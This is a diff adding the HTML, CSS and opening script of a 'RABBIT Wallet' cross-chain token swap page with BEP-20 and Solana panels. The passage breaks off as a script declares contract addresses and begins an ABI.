@@ -1,0 +1,1816 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+
+  <link rel="icon" href="../icon.png" />
+
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+
+  <meta name="theme-color" content="#000000" />
+
+  <!-- content -->
+  <meta name="description" content="RABBIT Wallet" />
+
+  <!-- title -->
+  <title>RABBIT Wallet</title>
+
+  <link href="static/css/style.css" rel="stylesheet" />
+  <link href="static/css/detail.css" rel="stylesheet" />
+  <link href="../css/style.css" rel="stylesheet" />
+  <link href="../css/reset.css" rel="stylesheet" />
+  <!-- animation -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Sansita+Swashed:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .bl {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .fl {
+      display: flex;
+      justify-content: space-evenly;
+      align-items: center;
+      width: 56%;
+      margin: auto;
+      margin-top: 50px;
+    }
+
+    .cuqfrm {
+      /* margin: auto; */
+      position: relative;
+      max-width: 420px;
+      width: 100%;
+      background: rgb(33, 36, 41);
+      box-shadow: rgba(0, 0, 0, 0.01) 0px 0px 1px,
+        rgba(0, 0, 0, 0.04) 0px 4px 8px, rgba(0, 0, 0, 0.04) 0px 16px 24px,
+        rgba(0, 0, 0, 0.01) 0px 24px 32px;
+      border-radius: 30px;
+      padding: 1rem;
+      opacity: 1;
+    }
+
+    .eYbwme {
+      margin-top: 20px;
+      display: flex;
+      flex-flow: row nowrap;
+      -webkit-box-align: center;
+      align-items: center;
+      border-radius: 3rem;
+      color: #fff;
+      justify-content: space-evenly;
+    }
+
+    .jpaQMh {
+      position: relative;
+    }
+
+    .bgrLUl {
+      display: grid;
+      grid-auto-rows: auto;
+      row-gap: 12px;
+    }
+
+    .fjrWSg {
+      display: flex;
+      flex-flow: column nowrap;
+      position: relative;
+      border-radius: 20px;
+      background-color: rgb(44, 47, 54);
+      z-index: 1;
+    }
+
+    .HmPpg {
+      border-radius: 20px;
+      border: 1px solid rgb(44, 47, 54);
+      background-color: rgb(33, 36, 41);
+    }
+
+    .jTAdga {
+      display: flex;
+      flex-flow: row nowrap;
+      -webkit-box-align: center;
+      align-items: center;
+      color: rgb(255, 255, 255);
+      font-size: 0.75rem;
+      line-height: 1rem;
+      padding: 0.75rem 1rem 0px;
+    }
+
+    .XssaD {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      width: 100%;
+      display: flex;
+      padding: 0px;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+      color: white;
+    }
+
+    .css-1qqnh8x {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      font-weight: 500;
+      font-size: 14px;
+      color: rgb(195, 197, 203);
+    }
+
+    .kmPvuu {
+      display: flex;
+      flex-flow: row nowrap;
+      -webkit-box-align: center;
+      align-items: center;
+      padding: 0.75rem 0.75rem 0.75rem 1rem;
+    }
+
+    .kdhyv {
+      color: rgb(255, 255, 255);
+      width: 0px;
+      position: relative;
+      font-weight: 500;
+      outline: none;
+      border: none;
+      flex: 1 1 auto;
+      background-color: rgb(33, 36, 41);
+      font-size: 24px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      padding: 0px;
+      appearance: textfield;
+    }
+
+    .jxsQpO {
+      -webkit-box-align: center;
+      align-items: center;
+      height: 2.2rem;
+      font-size: 20px;
+      font-weight: 500;
+      background-color: rgb(33, 36, 41);
+      color: rgb(255, 255, 255);
+      border-radius: 12px;
+      box-shadow: none;
+      outline: none;
+      cursor: pointer;
+      user-select: none;
+      border: none;
+      padding: 0px 0.5rem;
+    }
+
+    .bPCUef {
+      display: flex;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+    }
+
+    .dsgrxN {
+      width: 24px;
+      height: 24px;
+      box-shadow: rgba(0, 0, 0, 0.075) 0px 6px 10px;
+      border-radius: 24px;
+    }
+
+    .jqLKZP {
+      margin: 0px 0.25rem 0px 0.75rem;
+      font-size: 20px;
+    }
+
+    .gFwQvU {
+      margin: 0px 0.25rem 0px 0.5rem;
+      height: 35%;
+    }
+
+    .gFwQvU path {
+      stroke: rgb(255, 255, 255);
+      stroke-width: 1.5px;
+    }
+
+    .fgzRPw {
+      display: grid;
+      grid-auto-rows: auto;
+    }
+
+    .kQcrcj {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      width: 100%;
+      display: flex;
+      padding: 0px;
+      -webkit-box-align: center;
+      align-items: center;
+      flex-wrap: wrap;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+
+      padding: 0px 1rem;
+    }
+
+    .iKqiAX {
+      padding: 2px;
+    }
+
+    .gIIDHE {
+      -webkit-box-align: center;
+      align-items: center;
+      height: 2.2rem;
+      font-size: 20px;
+      font-weight: 500;
+      background-color: rgb(33, 114, 229);
+      color: rgb(255, 255, 255);
+      border-radius: 12px;
+      box-shadow: rgba(0, 0, 0, 0.075) 0px 6px 10px;
+      outline: none;
+      cursor: pointer;
+      user-select: none;
+      border: none;
+      padding: 0px 0.5rem;
+    }
+
+    .bPCUef {
+      display: flex;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+    }
+
+    .dmBlWD {
+      margin: 0px 0.25rem;
+      font-size: 16px;
+    }
+
+    .gFwQvU {
+      margin: 0px 0.25rem 0px 0.5rem;
+      height: 35%;
+    }
+
+    .gFwQvU path {
+      stroke: rgb(255, 255, 255);
+      stroke-width: 1.5px;
+    }
+
+    .FFjrp {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      width: 100%;
+      padding: 0.25rem 0.75rem 0px;
+      border-radius: 20px;
+    }
+
+    .KUBTK {
+      display: grid;
+      grid-auto-rows: auto;
+      row-gap: 4px;
+    }
+
+    .XssaD {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      width: 100%;
+      display: flex;
+      padding: 0px;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+    }
+
+    .css-1qqnh8x {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      font-weight: 500;
+      font-size: 14px;
+      color: rgb(195, 197, 203);
+    }
+
+    .feLCOL {
+      margin-top: 12px;
+    }
+
+    .fgcFZo {
+      padding: 18px;
+      width: 100%;
+      text-align: center;
+      border-radius: 20px;
+      outline: none;
+      border: 1px solid transparent;
+      text-decoration: none;
+      display: flex;
+      -webkit-box-pack: center;
+      justify-content: center;
+      flex-wrap: nowrap;
+      -webkit-box-align: center;
+      align-items: center;
+      cursor: pointer;
+      position: relative;
+      z-index: 1;
+      background-color: #192b48;
+      color: rgb(109, 168, 255);
+      font-size: 20px;
+      font-weight: 500;
+      letter-spacing: 3px;
+    }
+
+    /* The Modal (background) */
+    .modal {
+      display: none;
+      /* Hidden by default */
+      position: fixed;
+      /* Stay in place */
+      z-index: 168;
+      /* Sit on top */
+      padding-top: 100px;
+      /* Location of the box */
+      left: 0;
+      top: 0;
+      width: 100%;
+      /* Full width */
+      height: 100%;
+      /* Full height */
+      overflow: auto;
+      /* Enable scroll if needed */
+      background-color: rgb(0, 0, 0);
+      /* Fallback color */
+      /* background-color: rgba(0,0,0,0.4); Black w/ opacity */
+    }
+
+    /* Modal Content */
+    .modal-content {
+      background-color: rgb(33 37 41);
+      margin: auto !important;
+      padding: 20px;
+      border: 1px solid #888;
+
+      margin: 0px 0px 2rem;
+      border: 1px solid rgb(33, 36, 41);
+      background-color: rgb(33, 36, 41);
+      box-shadow: rgba(0, 0, 0, 0.05) 0px 4px 8px 0px;
+      padding: 0px;
+      width: 50vw;
+      align-self: center;
+      max-width: 420px;
+      max-height: 70vh;
+      min-height: 70vh;
+      display: flex;
+      border-radius: 20px;
+    }
+
+    /* The Close Button */
+    .close {
+      color: #aaaaaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+    }
+
+    .close:hover,
+    .close:focus {
+      color: #000;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    /* The Modal (background) */
+    .modal1 {
+      display: none;
+      /* Hidden by default */
+      position: fixed;
+      /* Stay in place */
+      z-index: 168;
+      /* Sit on top */
+      padding-top: 100px;
+      /* Location of the box */
+      left: 0;
+      top: 0;
+      width: 100%;
+      /* Full width */
+      height: 100%;
+      /* Full height */
+      overflow: auto;
+      /* Enable scroll if needed */
+      background-color: rgb(0, 0, 0);
+      /* Fallback color */
+      /* background-color: rgba(0,0,0,0.4); Black w/ opacity */
+    }
+
+    /* Modal Content */
+    .modal-content1 {
+      background-color: rgb(33 37 41);
+      margin: auto !important;
+      padding: 20px;
+      border: 1px solid #888;
+
+      margin: 0px 0px 2rem;
+      border: 1px solid rgb(33, 36, 41);
+      background-color: rgb(33, 36, 41);
+      box-shadow: rgba(0, 0, 0, 0.05) 0px 4px 8px 0px;
+      padding: 0px;
+      width: 50vw;
+      align-self: center;
+      max-width: 420px;
+      max-height: 70vh;
+      min-height: 70vh;
+      display: flex;
+      border-radius: 20px;
+    }
+
+    /* The Close Button */
+    .close1 {
+      color: #aaaaaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+    }
+
+    .close1:hover,
+    .close1:focus {
+      color: #000;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .xTygL[data-reach-dialog-content] {
+      margin: 0px 0px 2rem;
+      border: 1px solid rgb(33, 36, 41);
+      background-color: rgb(33, 36, 41);
+      box-shadow: rgba(0, 0, 0, 0.05) 0px 4px 8px 0px;
+      padding: 0px;
+      width: 50vw;
+      align-self: center;
+      max-width: 420px;
+      max-height: 70vh;
+      min-height: 70vh;
+      display: flex;
+      border-radius: 20px;
+    }
+
+    .lcECUE {
+      display: flex;
+      flex-direction: column;
+      -webkit-box-pack: start;
+      justify-content: flex-start;
+      width: 100%;
+    }
+
+    .kwAThP {
+      display: grid;
+      grid-auto-rows: auto;
+      row-gap: 14px;
+      padding: 20px 20px 12px;
+    }
+
+    .XssaD {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      width: 100%;
+      display: flex;
+      padding: 0px;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+    }
+
+    .css-xy7yfl {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      font-weight: 500;
+      font-size: 16px;
+    }
+
+    .xkrrd {
+      display: inline-block;
+    }
+
+    .ktapXa {
+      position: relative;
+      display: flex;
+      padding: 16px;
+      -webkit-box-align: center;
+      align-items: center;
+      width: 89%;
+      white-space: nowrap;
+      background: none;
+      outline: none;
+      border-radius: 20px;
+      color: rgb(255, 255, 255);
+      border: 1px solid rgb(64, 68, 79);
+      appearance: none;
+      font-size: 18px;
+      transition: border 100ms ease 0s;
+    }
+
+    .XssaD {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      width: 100%;
+      display: flex;
+      padding: 0px;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+    }
+
+    .css-1pfyy1z {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .hnSrRR {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      display: flex;
+      -webkit-box-align: center;
+      align-items: center;
+      width: fit-content;
+      padding: 8px;
+      background-color: rgb(44, 47, 54);
+      color: rgb(255, 255, 255);
+      border-radius: 8px;
+      user-select: none;
+    }
+
+    .css-1pfyy1z {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .divh {
+      width: 100%;
+      height: 1px;
+      background-color: rgb(44, 47, 54);
+    }
+
+    .divc {
+      position: relative;
+      height: 500px;
+      width: 100%;
+      overflow: auto;
+      will-change: transform;
+      direction: ltr;
+      flex: 1 1 0%;
+    }
+
+    .kPdtiq {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      width: 100%;
+      display: flex;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+      padding: 4px 20px;
+      height: 56px;
+      pointer-events: none;
+      opacity: 0.5;
+    }
+
+    .vKKRX {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      display: flex;
+      padding: 0px;
+      -webkit-box-align: center;
+      align-items: center;
+      width: fit-content;
+    }
+
+    .dsgrxN {
+      width: 24px;
+      height: 24px;
+      box-shadow: rgba(0, 0, 0, 0.075) 0px 6px 10px;
+      border-radius: 24px;
+      margin-right: 14px;
+    }
+
+    .lcECUE {
+      display: flex;
+      flex-direction: column;
+      -webkit-box-pack: start;
+      justify-content: flex-start;
+    }
+
+    .dGfLcK {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      width: 100%;
+      display: flex;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+      padding: 4px 20px;
+      height: 56px;
+      cursor: pointer;
+      opacity: 1;
+    }
+
+    .gjzETl {
+      width: 24px;
+      height: 24px;
+      background-color: white;
+      border-radius: 1rem;
+      box-shadow: rgba(0, 0, 0, 0.075) 0px 6px 10px;
+    }
+
+    .jhHwMR {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      width: 100%;
+      border-radius: 16px;
+      padding: 1.25rem;
+    }
+
+    .kRaYsh {
+      box-sizing: border-box;
+      margin: 0px;
+      min-width: 0px;
+      width: 100%;
+      display: flex;
+      padding: 0px;
+      -webkit-box-align: center;
+      align-items: center;
+      flex-wrap: wrap;
+      -webkit-box-pack: center;
+      justify-content: center;
+    }
+
+    .CgfTX {
+      border: none;
+      text-decoration: none;
+      background: none;
+      cursor: pointer;
+      color: rgb(33, 114, 229);
+      font-weight: 500;
+      outline: none;
+    }
+
+    .css-8mokm4 {
+      color: white;
+    }
+
+    @media (max-width: 767px) {
+      .fl {
+        flex-direction: column;
+      }
+
+      .bl {
+        flex-direction: row;
+      }
+
+      .svg1 {
+        transform: rotate(360deg) !important;
+      }
+
+      .svg2 {
+        transform: rotate(180deg) !important;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- The Modal -->
+  <div id="myModal" class="modal">
+    <!-- Modal content -->
+    <div aria-modal="true" role="dialog" tabindex="-1" aria-label="dialog" class="sc-fMiknA xTygL modal-content"
+      data-reach-dialog-content="">
+      <div class="sc-kpOJdX lcECUE" style="width: 100%">
+        <div class="sc-ckVGcZ sc-TFwJa kwAThP">
+          <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ XssaD" style="justify-content: flex-end;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+              class="sc-fjdhpX gsvsfq close">
+              <line x1="18" y1="6" x2="6" y2="18"></line>
+              <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+          </div>
+          <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ XssaD">
+            <div class="css-1pfyy1z">Select a token</div>
+            <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU sc-dTdPqK hnSrRR">
+              <div class="css-1pfyy1z">↓</div>
+            </div>
+          </div>
+        </div>
+        <div style="width: 100%; height: 1px; background-color: rgb(44, 47, 54)"></div>
+        <div style="
+              position: relative;
+              height: 500px;
+              width: 100%;
+              overflow: auto;
+              will-change: transform;
+              direction: ltr;
+              flex: 1 1 0%;
+            ">
+          <div style="height: 3248px; width: 100%">
+            <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ sc-bHwgHz dGfLcK token-item-usdt token-item" id="clickU" style="
+                  position: absolute;
+                  left: 0px;
+                  top: 0px;
+                  height: 56px;
+                  width: 100%;
+                ">
+              <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU vKKRX">
+                <img src="./static/images/bnb.png" class="sc-rBLzX dsgrxN" style="margin-right: 14px" />
+                <div class="sc-kpOJdX lcECUE">
+                  <div class="css-8mokm4 token-name">BNB</div>
+                  <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU sc-laTMn jOyjjD"></div>
+                </div>
+              </div>
+
+            </div>
+            <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ sc-bHwgHz dGfLcK token-item-eth token-item" id="clickE" style="
+                  position: absolute;
+                  left: 0px;
+                  top: 56px;
+                  height: 56px;
+                  width: 100%;
+                ">
+              <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU vKKRX">
+                <img src="./static/images/usdt.png" class="sc-jzgbtB gjzETl" style="margin-right: 14px" />
+                <div class="sc-kpOJdX lcECUE">
+                  <div class="css-8mokm4 token-name">USDT</div>
+                  <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU sc-laTMn jOyjjD"></div>
+                </div>
+              </div>
+            </div>
+            <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ sc-bHwgHz dGfLcK token-item-busd token-item" id="clickB" style="
+                  position: absolute;
+                  left: 0px;
+                  top: 112px;
+                  height: 56px;
+                  width: 100%;
+                ">
+              <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU vKKRX">
+                <img src="./static/images/busd.png" class="sc-jzgbtB gjzETl" style="margin-right: 14px" />
+                <div class="sc-kpOJdX lcECUE">
+                  <div class="css-8mokm4 token-name">BUSD</div>
+                  <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU sc-laTMn jOyjjD"></div>
+                </div>
+              </div>
+
+            </div>
+          </div>
+        </div>
+        <div style="width: 100%; height: 1px; background-color: rgb(44, 47, 54)"></div>
+        <div class="sc-bdVaJa sc-htpNat jhHwMR">
+          <div class="sc-bdVaJa sc-jKJlTe sc-kEYyzF kRaYsh">
+            <div>
+              <button class="sc-jzJRlG CgfTX" style="
+                    font-weight: 500;
+                    color: rgb(195, 197, 203);
+                    font-size: 16px;
+                  ">
+                Having trouble finding a token?
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div id="myModal1" class="modal1">
+    <!-- Modal content -->
+    <div aria-modal="true" role="dialog" tabindex="-1" aria-label="dialog" class="sc-fMiknA xTygL modal-content"
+      data-reach-dialog-content="">
+      <div class="sc-kpOJdX lcECUE" style="width: 100%">
+        <div class="sc-ckVGcZ sc-TFwJa kwAThP">
+          <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ XssaD" style="justify-content: flex-end;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+              class="sc-fjdhpX gsvsfq close">
+              <line x1="18" y1="6" x2="6" y2="18"></line>
+              <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+          </div>
+          <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ XssaD">
+            <div class="css-1pfyy1z">Select a token</div>
+            <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU sc-dTdPqK hnSrRR">
+              <div class="css-1pfyy1z">↓</div>
+            </div>
+          </div>
+        </div>
+        <div style="width: 100%; height: 1px; background-color: rgb(44, 47, 54)"></div>
+        <div style="
+                position: relative;
+                height: 500px;
+                width: 100%;
+                overflow: auto;
+                will-change: transform;
+                direction: ltr;
+                flex: 1 1 0%;
+              ">
+          <div style="height: 3248px; width: 100%">
+            <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ sc-bHwgHz dGfLcK token-item-usdt token-item" id="clickU1"
+              disabled="" style="
+                    position: absolute;
+                    left: 0px;
+                    top: 0px;
+                    height: 56px;
+                    width: 100%;
+                  ">
+              <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU vKKRX">
+                <img src="../sol.png" class="sc-rBLzX dsgrxN" style="margin-right: 14px" />
+                <div class="sc-kpOJdX lcECUE">
+                  <div class="css-8mokm4" id="token-name">SOL</div>
+                  <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU sc-laTMn jOyjjD"></div>
+                </div>
+              </div>
+
+            </div>
+            <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ sc-bHwgHz dGfLcK token-item-weth token-item" id="clickW" style="
+                    position: absolute;
+                    left: 0px;
+                    top: 56px;
+                    height: 56px;
+                    width: 100%;
+                  ">
+              <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU vKKRX">
+                <img src="./static/images/usdt.png" class="sc-jzgbtB gjzETl" style="margin-right: 14px" />
+                <div class="sc-kpOJdX lcECUE">
+                  <div class="css-8mokm4" id="token-name">USDT</div>
+                  <div class="sc-bdVaJa sc-jKJlTe sc-kkGfuU sc-laTMn jOyjjD"></div>
+                </div>
+              </div>
+
+            </div>
+
+          </div>
+
+        </div>
+        <div style="width: 100%; height: 1px; background-color: rgb(44, 47, 54)"></div>
+        <div class="sc-bdVaJa sc-htpNat jhHwMR">
+          <div class="sc-bdVaJa sc-jKJlTe sc-kEYyzF kRaYsh">
+            <div>
+              <button class="sc-jzJRlG CgfTX" style="
+                      font-weight: 500;
+                      color: rgb(195, 197, 203);
+                      font-size: 16px;
+                    ">
+                Having trouble finding a token?
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div id="root">
+    <div class="App" ">
+            <div class=" down-box"></div>
+    <div>
+      <div id="logo">
+        <a href="../"><img src="../rabbit wallet.png" alt="logo" /> </a>
+      </div>
+      <ul class="nav" style="height: unset">
+        <li class="nav-item">
+          <a aria-current="page" href="../">Home</a>
+        </li>
+        <li class="nav-item">
+          <a class="active" href="../cross-chain/">Cross chain</a>
+        </li>
+        <li class="nav-item"><a href="/https://t.me/rabbitonsui">Telegram</a></li>
+        <li class="nav-item"><a href="/https://twitter.com/RabbitWallets">Twitter</a></li>
+
+      </ul>
+      <ul class="nav-mob">
+        <li class="nav-item"><a aria-current="page" href="../">Home</a></li>
+        <li class="nav-item">
+          <a class="active" href="../cross-chain/">Cross chain</a>
+        </li>
+        <li class="nav-item"><a href="/https://t.me/rabbitonsui">Telegram</a></li>
+        <li class="nav-item"><a href="/https://twitter.com/RabbitWallets">Twitter</a></li>
+        <!-- <li class="nav-item"><a class="" href="stats.html">Stats</a></li> -->
+
+      </ul>
+    </div>
+    <div class="home">
+      <div class="wrapper-slogan">
+        <div class="text-logo">
+          <div class="text-logo-text1">Cross Chain</div>
+        </div>
+        <!-- <div class="slogan-title">Earn<span class="slogan-title-name">&nbsp;Shit&nbsp;</span>Tokens and Share
+                        Trading Fees Forever</div> -->
+      </div>
+      <div class="fl">
+        <div class="sc-fcdeBU cuqfrm">
+          <div class="sc-kLIISr eYbwme" style="margin-bottom: 20px">
+            <a aria-current="page" class="sc-qrIAp hhFPoj ACTIVE fontf" id="swap-nav-link " href="#/swap">BEP-20</a>
+          </div>
+          <div id="swap-page" class="sc-iGrrsa jpaQMh">
+            <div class="sc-ckVGcZ bgrLUl">
+              <div id="swap-currency-input" class="sc-ipXKqB fjrWSg">
+                <div class="sc-hmXxxW HmPpg">
+                  <div class="sc-giadOv jTAdga">
+                    <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ XssaD">
+                      <div class="sc-kGXeez kBROQR css-1qqnh8x">Amount</div>
+                    </div>
+                  </div>
+                  <div class="sc-jVODtj kmPvuu">
+                    <input class="sc-gPWkxV kdhyv token-amount-input" inputmode="decimal" title="Token Amount"
+                      autocomplete="off" autocorrect="off" type="text" pattern="^[0-9]*[.,]?[0-9]*$" placeholder="0.0"
+                      minlength="1" maxlength="79" spellcheck="false" value="" /><button
+                      class="sc-kUaPvJ jxsQpO open-currency-select-button" id="myBtn">
+                      <span class="sc-fONwsr bPCUef"><img id="imgToken" src="./static/images/bnb.png"
+                          class="sc-rBLzX dsgrxN" /><span class="sc-cqCuEk jqLKZP token-symbol-container"
+                          id="textToken">BNB</span><svg width="12" height="7" viewBox="0 0 12 7" fill="none"
+                          class="sc-VJcYb gFwQvU">
+                          <path d="M0.97168 1L6.20532 6L11.439 1" stroke="#AEAEAE"></path>
+                        </svg></span>
+                    </button>
+                  </div>
+                </div>
+              </div>
+              <div class="sc-bdVaJa sc-htpNat FFjrp">
+                <div class="sc-ckVGcZ KUBTK">
+                  <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ XssaD">
+                    <div class="css-1qqnh8x">Price</div>
+                    <div class="css-1qqnh8x" style="
+                            justify-content: center;
+                            align-items: center;
+                            display: flex;
+                          ">
+                      -
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="bl">
+          <svg style="transform: rotate(269deg)" class="svg1" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+            viewBox="0 0 24 24" fill="#1d2e48" stroke="#C3C5CB" stroke-width="2" stroke-linecap="round"
+            stroke-linejoin="round">
+            <line x1="12" y1="5" x2="12" y2="19"></line>
+            <polyline points="19 12 12 19 5 12"></polyline>
+          </svg>
+          <svg class="svg2" style="transform: rotate(90deg)" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+            viewBox="0 0 24 24" fill="#1d2e48" stroke="#C3C5CB" stroke-width="2" stroke-linecap="round"
+            stroke-linejoin="round">
+            <line x1="12" y1="5" x2="12" y2="19"></line>
+            <polyline points="19 12 12 19 5 12"></polyline>
+          </svg>
+        </div>
+
+
+        <div class="sc-fcdeBU cuqfrm">
+          <div class="sc-kLIISr eYbwme" style="margin-bottom: 20px">
+            <a aria-current="page" class="sc-qrIAp hhFPoj ACTIVE fontf" id="swap-nav-link" href="#/swap">SOLANA
+            </a>
+          </div>
+          <div id="swap-page" class="sc-iGrrsa jpaQMh">
+            <div class="sc-ckVGcZ bgrLUl">
+              <div id="swap-currency-input" class="sc-ipXKqB fjrWSg">
+                <div class="sc-hmXxxW HmPpg">
+                  <div class="sc-giadOv jTAdga">
+                    <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ XssaD">
+                      <div class="sc-kGXeez kBROQR css-1qqnh8x">Amount</div>
+                    </div>
+                  </div>
+                  <div class="sc-jVODtj kmPvuu">
+                    <input class="sc-gPWkxV kdhyv token-amount-input" inputmode="decimal" title="Token Amount"
+                      autocomplete="off" autocorrect="off" type="text" pattern="^[0-9]*[.,]?[0-9]*$" placeholder="0.0"
+                      minlength="1" maxlength="79" spellcheck="false" value="" /><button
+                      class="sc-kUaPvJ jxsQpO open-currency-select-button" id="myBtn1">
+                      <span class="sc-fONwsr bPCUef"><img id="imgToken1" src="../sol.png"
+                          class="sc-rBLzX dsgrxN" /><span class="sc-cqCuEk jqLKZP token-symbol-container"
+                          id="textToken1">SOL</span><svg width="12" height="7" viewBox="0 0 12 7" fill="none"
+                          class="sc-VJcYb gFwQvU">
+                          <path d="M0.97168 1L6.20532 6L11.439 1" stroke="#AEAEAE"></path>
+                        </svg></span>
+                    </button>
+                  </div>
+                </div>
+              </div>
+              <div class="sc-bdVaJa sc-htpNat FFjrp">
+                <div class="sc-ckVGcZ KUBTK">
+                  <div class="sc-bdVaJa sc-jKJlTe sc-eNQAEJ XssaD">
+                    <div class="css-1qqnh8x">Price</div>
+                    <div class="css-1qqnh8x" style="
+                            justify-content: center;
+                            align-items: center;
+                            display: flex;
+                          ">
+                      -
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+      <div class="center-btn">
+        <button class="sc-bdVaJa dkzats sc-jAaTju sc-gPEVay fgcFZo">
+          Comingsoon
+        </button>
+      </div>
+    </div>
+    <div class="footer">
+      <div class="footer-box">
+        <a href="https://t.me/rabbitonsui" target="new_tab">
+          <div class="footer-logo footer-logo1"></div>
+        </a><a href="https://twitter.com/RabbitWallets" target="new_tab">
+          <div class="footer-logo footer-logo2"></div>
+        </a>
+        <a href="https://t.me/rabbitonsui" target="new_tab">
+          <div class="footer-logo footer-logo1"></div>
+        </a>
+      </div>
+    </div>
+  </div>
+  </div>
+
+  <div id="eJOY__extension_root" class="eJOY__extension_root_class" style="all: unset"></div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.0/web3.min.js"
+    integrity="sha512-ppuvbiAokEJLjOUQ24YmpP7tTaLRgzliuldPRZ01ul6MhRC+B8LzcVkXmUsDee7ne9chUfApa9/pWrIZ3rwTFQ=="
+    crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.js"
+    integrity="sha512-WNLxfP/8cVYL9sj8Jnp6et0BkubLP31jhTG9vhL/F5uEZmg5wEzKoXp1kJslzPQWwPT1eyMiSxlKCgzHLOTOTQ=="
+    crossorigin="anonymous"></script>
+
+  <script>
+    // var contract = "0x5d79c03dCC11AB7bE4a57857Fc840Ba24bfa4C53";
+    let contract_ad = "TF8SdqXo4U35MKgBdYzfY2E6poKCCtNSTX";
+    let usdt_contract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    let usdt_farm_contract = "TX26d6Twi1aTyz6ag6YhzkTuRfh7bpTbbc";
+    var usdt_contract_ad = '0xe9e7cea3dedca5984780bafc599bd69add087d56';
+    var farm_contract_ad = '0x98b3fE5a9fa5B544Cb5c8cAB869f75ec59c6C2Eb';
+    var address0 = "0x0000000000000000000000000000000000000000";
+    const usdt_abi = [{
+      "inputs": [],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    }, {
+      "anonymous": false,
